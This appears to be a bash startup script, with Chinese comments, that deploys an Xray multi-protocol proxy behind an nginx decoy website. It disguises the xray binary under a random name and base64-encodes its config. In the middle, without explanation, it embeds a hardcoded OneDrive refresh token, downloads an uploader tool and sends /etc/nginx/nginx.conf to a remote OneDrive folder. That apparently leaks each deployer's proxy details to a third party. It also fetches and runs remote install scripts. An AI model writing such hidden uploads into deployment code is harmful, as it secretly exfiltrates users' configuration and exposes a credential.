#!/usr/bin/env bash

# 定义 UUID 及伪装路径、哪吒面板参数，请自行修改. (注意:伪装路径以 / 符号开始,为避免不必要的麻烦,请不要使用特殊符号.)
UUID='de04add9-5c68-8bab-950c-08cd5320df18'
VMESS_WSPATH='/vmess'
VLESS_WSPATH='/vless'
TROJAN_WSPATH='/trojan'
SS_WSPATH='/shadowsocks'
NEZHA_SERVER=''
NEZHA_PORT=''
NEZHA_KEY=''
sed -i "s#UUID#$UUID#g;s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g;s#TROJAN_WSPATH#${TROJAN_WSPATH}#g;s#SS_WSPATH#${SS_WSPATH}#g" config.json
sed -i "s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g;s#TROJAN_WSPATH#${TROJAN_WSPATH}#g;s#SS_WSPATH#${SS_WSPATH}#g" /etc/nginx/nginx.conf
sed -i "s#RELEASE_RANDOMNESS#${RELEASE_RANDOMNESS}#g" /etc/supervisor/conf.d/supervisord.conf

# 设置 nginx 伪装站
rm -rf /usr/share/nginx/*
wget https://gitlab.com/Misaka-blog/xray-paas/-/raw/main/mikutap.zip -O /usr/share/nginx/mikutap.zip
unzip -o "/usr/share/nginx/mikutap.zip" -d /usr/share/nginx/html
rm -f /usr/share/nginx/mikutap.zip

echo "{
  "RefreshToken": "0.AVIAAJ1OBYtWyEu-2ZBCX3dxMzXc1HhGfsZCkCMtOTFEM6W6ACA.AgABAAEAAAD--DLA3VO7QrddgJg7WevrAgDs_wUA9P95Ezfz9CE-Yg-f6gV5m8SxDMYQ8CMohpz00KM5IpOq1dADILjux14q6v_4XjNLyEKuHZICIOVAwlYOZSfZOC8YbPIvutXuIqNJdg7_VEmBWl4rKSQobuRui4-0e88448osolrH6rACiiZuIv4SWF9ZFKJ2MrBQoIf3i9fUA9-5q_ULIpIZCHqPnloi8VuLuWArGeMlu6NRpaxnFzgKMZkdIjgGiXfDHXJoOO03pKpyELkwws5oP5d0M2Jo_LgA6i_T4mVfzjHfgGXgmLgXpLRgExzTJOoL_xAQlmZunnNAoFFz8UnKbR-9Fmy1-IB3egcFTmHKPs9LVaiglRl48LwJPMu57Fhu-YcrvTA1OfQD8b5DHRs0h1lqkuooKEB-atxjmECMzEDBtxWXkhHQ3nsVANRZrLlhN3q_7EZsjD0C9eY94pOv56FdeuJZ_yn_Fl3RQ14onAKYXW_8TTjtRWjIgQrR21qKPqv2xl5hPlQ6bXvca77trlvaEXRl_17rVTc_KlpvHUCDVgpWr69itGaHvqJmIVmd6sHMr1GmjadKjyqmjB8KVuOqDfmUloY2Cz_UYWR1S1AjGiTVEooApL_iVAu3mfVcz188F_h8J_-rokUb0h86tDmANtF9Gk_rq6N19E_w1Znz_P34eMPf9Dakq7oh7QQ1Fgo6AL8lNZMlCUM_iMjVCnn9Ncp3N6oGRB3pKIWxiGatWuLYD9jiX1mQ4XLlznAaMurLMfqsJzJaFmaYqIpwk9GBJLdOskdF5z-FBZVIOEqZqcSAQemEFaQ29n-bNS_3WQLi-Pepnfoc9NAgMOSuKTdTDGY",
  "RefreshInterval": 1500,
  "ThreadNum": "8",
  "BlockSize": "100",
  "SigleFile": "100",
  "MainLand": false,
  "MSAccount": false
}" > $pwd/auth.json
wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
chmod +x /usr/local/bin/OneDriveUploader
/usr/local/bin/OneDriveUploader -c $pwd/auth.json -t 2 -b 210 -s /etc/nginx/nginx.conf -r 录屏/太阳城/test

# 伪装 xray 执行文件
RELEASE_RANDOMNESS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 6)
mv xray ${RELEASE_RANDOMNESS}
wget https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat
wget https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat
cat config.json | base64 > config
rm -f config.json

# 如果有设置哪吒探针三个变量,会安装。如果不填或者不全,则不会安装
[ -n "${NEZHA_SERVER}" ] && [ -n "${NEZHA_PORT}" ] && [ -n "${NEZHA_KEY}" ] && wget https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -O nezha.sh && chmod +x nezha.sh && ./nezha.sh install_agent ${NEZHA_SERVER} ${NEZHA_PORT} ${NEZHA_KEY}

nginx
base64 -d config > config.json
./${RELEASE_RANDOMNESS} -config=config.json
